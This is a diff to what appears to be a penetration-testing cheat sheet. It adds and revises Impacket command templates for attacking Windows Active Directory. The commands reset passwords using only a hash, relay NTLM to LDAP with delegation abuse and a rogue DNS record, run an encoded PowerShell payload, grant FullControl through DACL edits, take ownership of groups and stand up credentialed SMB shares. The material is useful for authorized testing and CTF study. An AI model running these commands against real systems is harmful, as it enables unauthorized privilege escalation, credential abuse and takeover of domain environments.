@@ -4736,11 +4736,17 @@ evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIV
 impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
 ```
 
+##### impacket-changepasswd
+
+```console
+impacket-changepasswd <DOMAIN>/<USERNAME>@<RHOST> -reset -altuser <USERNAME> -althash :<HASH>
+```
+
 ##### impacket-dcomexec
 
 ```shell
-impacket-dcomexec <RHOST> -object MMC20 -silentcommand -debug '<DOMAIN>/<USERNAME>':'<PASSWORD>' '<COMMAND>'
-impacket-dcomexec -dc-ip <RHOST> -object MMC20 -slientcommand '<DOMAIN>/<USERNAME>@<RHOST>' '<COMMAND>'
+impacket-dcomexec <RHOST> -object MMC20 -silentcommand -debug <DOMAIN>/<USERNAME>:<PASSWORD> <COMMAND>
+impacket-dcomexec -dc-ip <RHOST> -object MMC20 -slientcommand <DOMAIN>/<USERNAME>@<RHOST> <COMMAND>
 ```
 
 ##### impacket-findDelegation
@@ -4806,14 +4812,16 @@ impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /P
 ###### Common Commands
 
 ```shell
-impacket-ntlmrelayx -t <LHOST> --no-http-server -smb2support -c "powershell -enc JAB<--- SNIP --->j=="
+impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --interactive
+impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --no-dump --add-dns-record 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' '<LHOST>'
 impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
+impacket-ntlmrelayx -t <LHOST> --no-http-server -smb2support -c "powershell -enc JAB<--- SNIP --->j=="
 ```
 
 ###### Example
 
 ```shell
-impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA<--- CUT FOR BREVITY --->"
+impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JAB<--- SNIP --->j=="
 ```
 
 ```cmd
@@ -4883,13 +4891,14 @@ impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
 ##### impacket-smbpasswd
 
 ```shell
-impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
+impacket-smbpasswd <RHOST>/<USERNAME>:<PASSWORD>@<RHOST> -newpass <PASSWORD>
 ```
 
 ##### impacket-smbserver
 
 ```shell
-impacket-smbserver local . -smb2support
+impacket-smbserver share . -smb2support
+impacket-smbserver -smb2support share <FOLDER> -user <USERNAME> -password <PASSWORD>
 ```
 
 ##### impacket-ticketer
@@ -4931,6 +4940,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 ```shell
 python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -dc-ip <RHOST> -debug
 python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>' -k -dc-ip <RHOST> -debug
+python3 dacledit.py -action 'write' -rights 'FullControl' -principal '<USERNAME>' -target-dn 'CN=<GROUP{>,CN=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
 python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <RHOST>
 python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'OU=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -use-ldaps -dc-ip <RHOST>
 ```
@@ -4951,7 +4961,7 @@ Then put the `msada_guids.py` into the same directory as `dacledit.py`
 > https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py
 
 ```shell
-python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
+python3 owneredit.py -k <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -action write -new-owner <USERNAME> -target <GROUP> -debug
 ```
 
 ##### ThePorgs Fork
